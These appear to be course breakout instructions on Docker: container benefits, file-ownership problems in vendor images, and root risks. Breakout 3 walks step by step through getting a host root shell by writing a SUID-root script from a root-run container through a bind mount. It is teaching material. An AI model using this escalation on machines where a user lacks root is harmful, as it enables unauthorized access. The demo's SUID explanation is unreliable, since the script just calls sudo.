# Instructions for Breakouts for Week 04

## Breakout 1 - Containers: the Good

Make a list and discuss the advantages of using containers: 

* Include microservices and images in your discussion.

* Include some examples of business cases / use cases.  Try to include a specific example that we haven't covered.

## Breakout 2 - Containers: the Bad

One major advantage of using containers is that we can leverage vendor container images to save us numerous hours of installation and setup work.

The bad side to this is that a lot of vendor products were designed long before containers were invented, or were designed by people lacking knowledge of containers, or were designed by people lacking a fundamental knowledge of Linux best practices, cybersecurity, etc.  

A lot of well known vendors have containers that have a lot of really bad decisions in them that cause major Linux issues, cybersecurity issues, etc.

A lot of times, a container is viewed as a "nice to have" and an afterthought rather than a fundamentally designed part of the product.  Often, on official images, I see comments like "Sorry about that, I'm an intern on my second week, and I've never used Docker before".   This seems incongruent with the way shops are pushing containers.  

Let's look at and discuss one common major bad decision:  ownership and permissions of files and directories used in remote mounts to containers.

Recall from one of this week's labs, "Lab: Docker - Persistence, Directory Mounting to Containers", that we have remote mounts to pass data to and from containers in the form of directories and files.  A lot of vendor products require files and directories to be owned by specific users and specific groups with specific permissions set.  If you change the ownership or permissions, the product may stop working outright, or parts of the product may not work, or part of the product may not work correctly.  So, we are stuck with using them.

Our directory /home/w205 is owned by w205 with group mids.  Linux best practices dictates that no file under /home/w205 should be owned by anything than w205 with group mids.  When running backups, we have already seen the major issues and security issues this causes.  We have to have access to sudo just to backup files.  When it's our machine, it's ok for us to have sudo access, however, in a production environment, it would be 100% unacceptable to grant every user who runs these images sudo access.

Several containers have these issues. 

Let's look at postgres.

The commands:
```
cd ~/docker/mounts/postgres

ls -l 
```
yields output:
```
drwxrw---- 19 libstoragemgmt root 4096 Jan 17 12:02 data
```

Discuss the following:
* Did postgres choose the user libstoragemgmt to own the files?
* What are the consequences to the user libstoragemgmt of the VM?
* Why is root the group?

Let's look at neo4j:

The commands:
```
cd ~/docker/mounts/neo4j

ls -l
```
yields output:
```
drwxrwxr-x 5 7474 7474 55 Nov 17 21:01 data
```

Discuss the following:
* Why is 7474 listed as the owner?
* Why is 7474 listed as the group?
* What would be the consequences if the VM has a user with id 7474?
* What would be the consequences if the VM has a group with id 7474?

## Breakout 3 - Containers: the Ugly

In the world of hacking, getting a "root shell" to a Linux box is the "Holy Grail".  Once hackers have a root shell, they have full access to the machine.  If SSH private keys are present on the server, they can use those private keys to gain access to even more servers, and so forth.  

When Docker is running as root, anyone who can run a Docker container, or access a Docker container, can easily get a root shell.  Here is the procedure:

Create a temporary directory:
```
cd

mkdir temp_root_shell

cd temp_root_shell
```
Run a docker container with the directory mounted:
```
docker run -it --rm -v /home/w205/temp_root_shell:/temp_root_shell continuumio/anaconda3:latest bash
```
You are now inside the container. Run the following and exit the container:
```
cd /temp_root_shell

echo \#\!/usr/bin/bash >root_shell.bash

echo sudo bash >>root_shell.bash

chmod 4777 root_shell.bash

exit
```
Back in the VM, we can see that the SUID (user + special) permission is set.  Notice the s in the usual place of the x.  This tells Linux to execute the process as the owner instead of the user.  In our case the user is w205 and the owner is root.  So the bash shell script root_shell.bash will give us a root shell!
```
ls -l 
```
which yields
```
-rwsrwxrwx 1 root root 21 Jan 24 19:32 root_shell.bash
```
Now we can run the script:
```
./root_shell.bash
```
Which yields a root shell:
```
[root@ip-172-31-71-148 temp_root_shell]#
```
We can verify user is indeed root:
```
whoami
```
Which yield 
```
root
```
Exit the root shell:
```
exit
```
Delete the temporary directory when we are done:
```
cd

rm -r temp_root_shell
```

What can we conclude about running Docker as root?
* Consider the case where we own the VM, such as our VM for w205, where we already have root access
* Consider the case of a corporate environment, where the VM is owned by an admin, and we should not have root access

Most vendor supplied images assume Docker will be run as root, and they will not run, or will not run correctly otherwise.  If we attempt to run Docker not as root, what would be the consequences?


## Breakout 4 - Review and discuss the Dockerfiles for container images used in this course

In the labs, we walked through the Dockerfiles for container images.  Review the Dockerfiles again and discuss them.

ucb_mids_w205_repo => labs => week_04 => lab_instructions_04.md

Scroll down to the section Lab: Docker - Creating an Image

## Breakout 5 - Review and discuss the documentation and Dockerfiles for the official images used in this course

In the labs, we walked through the documentation and Dockefiles for the official images used to build the custom container images used in this course.  Review the documentation and Dockefiles again and discuss them.

ucb_mids_w205_repo => labs => week_04 => lab_instructions_04.md

Scroll down to the section Lab: Lab: Docker - Examples of How Various Official Images are Built
